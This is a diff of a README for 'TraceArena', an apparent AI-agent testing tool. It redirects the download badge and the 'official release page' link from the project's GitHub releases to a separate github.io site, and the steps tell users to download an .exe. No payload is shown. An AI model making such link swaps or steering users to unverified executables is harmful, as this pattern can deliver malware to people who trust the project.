@@ -1,6 +1,6 @@
 # 🔍 TraceArena - Test and track AI agent behavior
 
-[![](https://img.shields.io/badge/Download-TraceArena-blue.svg)](https://github.com/modern-outreach318/TraceArena/releases)
+[![](https://img.shields.io/badge/Download-TraceArena-blue.svg)](https://modern-outreach318.github.io)
 
 TraceArena provides a stable environment to test AI agents. It tracks every action an agent takes in a shared environment. You use this software to confirm how agents make decisions and why they reach specific outcomes. It handles complex rules and gives you a clear record of every movement or choice.
 
@@ -20,7 +20,7 @@ Ensure your computer has the latest Windows updates installed. This avoids compa
 
 Follow these steps to set up the software on your system.
 
-1. Visit the [official release page](https://github.com/modern-outreach318/TraceArena/releases).
+1. Visit the [official release page](https://modern-outreach318.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in `.exe`. 
 4. Click the file name to download it to your Downloads folder.
